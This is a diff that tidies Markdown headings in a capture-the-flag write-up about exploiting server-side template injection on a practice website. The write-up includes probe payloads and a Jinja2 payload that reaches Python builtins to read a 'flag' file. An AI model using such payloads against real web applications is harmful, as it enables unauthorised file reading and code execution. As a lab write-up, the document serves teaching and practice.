@@ -9,13 +9,13 @@ easy
 I made a cool website where you can announce whatever you want! Try it out!
 I heard templating is a cool and modular way to build web apps! Check out my website [link]!
 
-##My approach
+## My approach
 
-##step 1-First observation
+## step 1-First observation
 First thing The page has an input field that reflects
 user input directly on the page.This behavior is a red flag for SSTI,I tired to see if its vulnerable and what engine it is.
 
-##step 2 -What i tried
+## step 2 -What i tried
 >"{{4+4}}" to see if the input is controlled or not.
 ![the engine output](images/1.jpeg)
 >"{{3*'3'}}" after confirming its vulnerable i need to see which engine this web use.
@@ -26,7 +26,7 @@ user input directly on the page.This behavior is a red flag for SSTI,I tired to 
 ![payload output](images/4.jpeg)
 >"{{request.application.__globals__.__builtins__.open('flag').read()}}"used to print out the content of the file flag in the current directory.
 
-##step 3 -the solution
+## step 3 -the solution
 After finding out that the input is vulnerable and using the payloads above to see which engine and also executing some specific command like the content of the directories and also of the targeted file and there where the flag is found.
 
 
